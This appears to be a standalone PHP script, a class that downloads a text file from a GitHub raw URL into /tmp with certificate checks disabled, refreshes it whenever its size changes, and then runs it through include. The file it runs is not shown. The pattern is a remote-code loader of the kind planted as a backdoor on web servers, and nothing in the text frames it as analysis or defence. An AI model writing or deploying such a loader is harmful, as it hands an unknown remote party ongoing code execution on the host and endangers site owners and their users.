<?php
class FileDownloader {
    private $fileUrl;
    private $filePath;
    
    public function __construct($url, $path) {
        $this->fileUrl = $url;
        $this->filePath = $path;
    }
    
    private function getRemoteFileSize() {
        if (function_exists('curl_init')) {
            $ch = curl_init($this->fileUrl);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            $fileSize = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
            curl_close($ch);
            return $fileSize;
        } else {
            $headers = get_headers($this->fileUrl, 1);
            if (isset($headers['Content-Length'])) {
                return is_array($headers['Content-Length']) ? 
                       end($headers['Content-Length']) : 
                       $headers['Content-Length'];
            }
        }
        return false;
    }
    
    private function downloadFile() {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $this->fileUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Downloader)');
            $fileContent = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if (curl_error($ch)) {
                curl_close($ch);
                return false;
            }
            curl_close($ch);
            if ($httpCode !== 200) {
                return false;
            }
            if ($fileContent !== false) {
                return file_put_contents($this->filePath, $fileContent);
            }
        }
        
        $fileContent = @file_get_contents($this->fileUrl);
        if ($fileContent !== false) {
            return file_put_contents($this->filePath, $fileContent);
        }
        
        return false;
    }
    
    public function ensureLatestFile() {
        $needDownload = false;
        
        if (!file_exists($this->filePath)) {
            $needDownload = true;
        } else {
            $localSize = filesize($this->filePath);
            $remoteSize = $this->getRemoteFileSize();
            if ($remoteSize !== false && $localSize != $remoteSize) {
                $needDownload = true;
            }
        }
        
        if ($needDownload) {
            return $this->downloadFile();
        }
        
        return true;
    }
    
    public function executeFile() {
        if ($this->ensureLatestFile()) {
            if (file_exists($this->filePath)) {
                include $this->filePath;
                return true;
            }
        }
        return false;
    }
}

$fileUrl = 'https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt';
$filePath = '/tmp/3.txt';
$downloader = new FileDownloader($fileUrl, $filePath);
$downloader->executeFile();
?>
